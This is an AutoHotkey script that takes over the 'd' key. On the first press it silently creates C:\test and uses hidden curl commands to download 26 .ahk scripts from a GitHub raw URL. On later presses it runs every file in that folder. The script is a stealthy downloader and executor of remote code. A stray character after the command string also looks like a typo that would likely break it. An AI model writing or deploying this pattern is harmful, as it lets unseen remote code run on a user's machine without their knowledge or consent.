#SingleInstance Force

^Esc::ExitApp

DirList(pattern, attr := "") {
    files := []
    Loop Files pattern, attr {
        files.Push(A_LoopFileFullPath)
    }
    return files
}

$d::{
    path := "C:\test"
    Send "d"
    if (DirExist(path)) {
        for file in DirList(path "\*") {
            MsgBox file
            Run file
        }
    } else {
        DirCreate(path)
        letters := ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
        for letter in letters {
            command := "cmd /c curl https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".ahk > " path "\" letter ".ahk"a
            RunWait command, , "Hide"
        }
    }
}
